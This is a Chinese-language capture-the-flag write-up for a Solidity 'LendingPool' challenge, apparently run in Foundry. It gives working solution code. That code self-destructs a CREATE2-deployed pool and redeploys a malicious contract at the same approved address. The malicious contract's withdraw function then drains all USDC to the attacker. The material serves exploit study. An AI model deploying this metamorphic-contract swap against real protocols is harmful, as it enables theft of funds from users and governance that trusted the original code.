## LendingPool
本题我们扮演LendingPool的创建者hacker，发现部署合约都是用的create和create2

create只要部署者的地址和nance，而nance都是不可重复的，所以基本不会相同地址，但是create2不一样，create2需要部署者地址，自定义的salt和字节码bytecode，只要salt和bytecode一样我们就可以部署相同地址的相同合约，前提是目标地址没有代码，而自毁功能可以将salt和bytecode都归零

看了下最后的测试要求，思路是自毁LendingPool和createDeploy，然后重新部署

### 解题

#### LendingHack

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {USDC} from "./USDC.sol";

/**
 * @title LendingPool
 */
contract LendingHack is Ownable {
    /*//////////////////////////////
    //    Add your hack below!    //
    //////////////////////////////*/
    mapping(address => uint256) public balances;
    USDC public usdc;
    string public constant name = "LendingPool hack";
    /**
     * @dev Constructor that sets the owner of the contract
     * @param _usdc The address of the USDC contract to use
     * @param _owner The address of the owner of the contract
     */
    constructor(address _owner, address _usdc) {
        _transferOwnership(_owner);
        usdc = USDC(_usdc);
    }


    function withdraw(address _add) public {
       
        usdc.transfer(_add , usdc.balanceOf(address(this)));

        
    }
    //============================//
}
```

#### test

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import {LendingPool} from "../src/3_LendingPool/LendingPool.sol";
import {Create2Deployer} from "../src/3_LendingPool/Create2Deployer.sol";
import {CreateDeployer} from "../src/3_LendingPool/CreateDeployer.sol";
import {LendingHack} from "../src/3_LendingPool/LendingHack.sol";
import {USDC} from "../src/3_LendingPool/USDC.sol";
import {LendExGovernor} from "../src/3_LendingPool/LendExGovernor.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge3Test is Test {
    USDC public usdc;
    uint256 public usdcAmount = 100000;
    LendExGovernor public lendExGovernor;
    CreateDeployer public createDeployer;
    Create2Deployer public create2Deployer;

    LendingPool public lendingPool;
    LendingHack public lendingHack;

    address public hacker = makeAddr("hacker");
    address public governanceOwner = makeAddr("governanceOwner");

    function setUp() public {
        /* set up actions */
        usdc = new USDC(usdcAmount);
        usdc.transfer(governanceOwner, usdcAmount);

        /* sending transactions as hacker */
        // deploying the LendingPool contract
        vm.startPrank(hacker);
        create2Deployer = new Create2Deployer();
        createDeployer = CreateDeployer(create2Deployer.deploy());
        lendingPool = LendingPool(createDeployer.deploy(true, address(usdc)));
        vm.stopPrank();

        /* sending transactions as the governance owner */
        // deploying the LendingPool contract
        vm.startPrank(governanceOwner);
        lendExGovernor = new LendExGovernor(address(usdc));
        lendExGovernor.addContract(address(lendingPool));
        usdc.transfer(address(lendExGovernor), usdcAmount);
        // funding the LendingPool contract with USDC
        lendExGovernor.fundLendingPool(address(lendingPool), usdcAmount);
        vm.stopPrank();

        assertEq(
            lendExGovernor.getPoolName(address(lendingPool)),
            "LendingPool V1",
            "lendingPool contract has the original name"
        );
        vm.startPrank(hacker);
        /*//////////////////////////////////////////////////////////////////////
        //                      Add your hack below!                          //
        //                          Hack part #1                              //
        // NOTE!!! Foundry has a bug                                          //
        // anything selfdestruct() related has to be in the setUp() function  //
        //                                                                    //
        // terminal command to run the speciffic test:                        //
        // forge test --match-contract Challenge3Test -vvvv                   //
        //////////////////////////////////////////////////////////////////////*/
        createDeployer.cleanUp();
        lendingPool.emergencyStop();


    
        //====================================================================//
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(hacker);
        /*//////////////////////////////////////////////////////////////
        //                    Add your hack below!                    //
        //                        Hack part #2                        //
        // Please implement necessary changes also to LendingHack.sol //
        // terminal command to run the specific test:                 //
        // forge test --match-contract Challenge3Test -vvvv           //
        //////////////////////////////////////////////////////////////*/

        createDeployer = CreateDeployer(create2Deployer.deploy());
        lendingHack = LendingHack(createDeployer.deploy(false, address(usdc)));//为满足下面的要求LengdingPool hack
        lendingHack.withdraw(hacker);

        //=============================================================//
        vm.stopPrank();

        assertEq(
            lendExGovernor.getPoolName(address(lendingPool)),
            "LendingPool hack",
            "lendingPool contract address now gives a different name"
        );
        assertEq(usdc.balanceOf(hacker), usdcAmount, "Hacker has to steal all the stablecoin tokens");
    }
}
```
